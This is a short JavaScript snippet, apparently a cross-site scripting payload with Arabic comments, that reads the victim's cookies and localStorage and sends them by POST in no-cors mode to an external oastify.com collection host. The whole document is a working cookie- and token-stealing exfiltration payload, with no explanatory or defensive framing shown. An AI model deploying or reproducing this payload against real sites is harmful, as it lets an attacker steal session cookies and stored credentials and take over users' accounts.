


var userCookies = document.cookie;
var userStorage = JSON.stringify(localStorage);


var exfilData = "===== COOKIES =====\n" + userCookies + "\n\n===== LOCAL STORAGE =====\n" + userStorage;

fetch("https://2nqfrsyf5u919k496pa4iwbu9lfc33rs.oastify.com/", {
    method: "POST",       // استخدام POST عشان الداتا الكبيرة
    mode: "no-cors",      // تخطي إيرور الـ CORS
    body: exfilData       // حط الداتا كلها هنا
});
